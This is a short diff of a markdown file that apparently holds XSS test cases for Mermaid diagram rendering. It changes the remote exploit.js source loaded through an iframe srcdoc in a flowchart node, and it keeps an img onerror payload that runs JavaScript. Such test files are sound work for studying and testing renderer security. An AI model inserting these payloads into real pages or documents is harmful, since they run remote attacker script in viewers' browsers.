@@ -24,11 +24,11 @@ pentest
   graph LR
       B-->D(<img onerror=location=`javascript\u003aalert\u0028document.domain\u0029` src=x>);
  ```
-## XSS Test 3
+## XSS Test 2
 ```mermaid  
 %%{init: {"flowchart": {"htmlLabels": "false"}} }%%  
 flowchart  
-  A["<iframe srcdoc='<script src=https://github.com/vapt-cen1/injection/blob/main/exploit.js></script>'></iframe>"]  
+  A["<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>'></iframe>"]  
 ```
 ## iFrames Test
 
